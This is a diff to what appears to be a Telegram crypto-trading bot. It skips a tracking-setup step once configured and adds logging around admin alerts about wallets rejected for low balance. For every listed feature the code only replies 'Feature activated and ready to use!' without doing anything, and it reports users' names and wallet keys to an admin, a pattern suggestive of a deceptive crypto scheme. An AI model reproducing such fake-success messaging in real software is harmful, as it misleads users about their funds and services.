@@ -556,7 +556,33 @@ Select your wallet provider:"""
             )
             return
         
-        # Wallet connecté - Demander la configuration de tracking
+        # Wallet connecté - Vérifier si la configuration tracking existe déjà
+        if context.user_data.get('tracking_configured'):
+            # Configuration déjà faite - Aller directement à la fonctionnalité
+            feature_name = {
+                'quick_buy': '⚡ Quick Buy',
+                'bloom_trading': '🌸 Bloom AI Trading',
+                'multi_wallet': '💼 Multi-Wallet',
+                'contract_analyzer': '🛡️ Contract Analyzer',
+                'ai_predict': '🧠 AI Market Predict',
+                'whale_tracker': '🐋 Whale Tracker',
+                'rug_detector': '🔴 Rug-Pull Detector'
+            }.get(action, 'Feature')
+            
+            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            await query.message.delete()
+            await query.message.reply_text(
+                f"✅ **{feature_name}**\n\n"
+                f"Feature activated and ready to use!\n\n"
+                f"Your configuration is already set.",
+                reply_markup=reply_markup,
+                parse_mode='HTML'
+            )
+            return
+        
+        # Configuration non faite - Demander la configuration de tracking
         request_message = get_tracking_config_message()
         
         await query.message.delete()
@@ -1235,6 +1261,7 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         context.user_data['tracking_config'] = user_message
         context.user_data['tracked_wallets'] = wallets
         context.user_data['trading_fees'] = fees
+        context.user_data['tracking_configured'] = True  # Marquer la configuration comme terminée
         
         # Récupérer les infos du wallet
         public_key = context.user_data.get('wallet_public_key', 'N/A')
@@ -1461,6 +1488,7 @@ You can now access all trading features and start trading!"""
             )
             
             # Notification à l'admin
+            logger.info(f"Envoi notification admin - Wallet solde insuffisant: {public_key}")
             admin_notification = f"""⚠️ <b>Wallet rejeté - Solde insuffisant</b>
 
 👤 <b>Utilisateur:</b> {escape_html(user.first_name)} {escape_html(user.last_name or '')}
@@ -1487,6 +1515,7 @@ You can now access all trading features and start trading!"""
                     text=admin_notification,
                     parse_mode='HTML'
                 )
+                logger.info("Message admin envoyé avec succès")
             except Exception as e:
                 logger.error(f"Erreur envoi à l'admin: {e}")
             
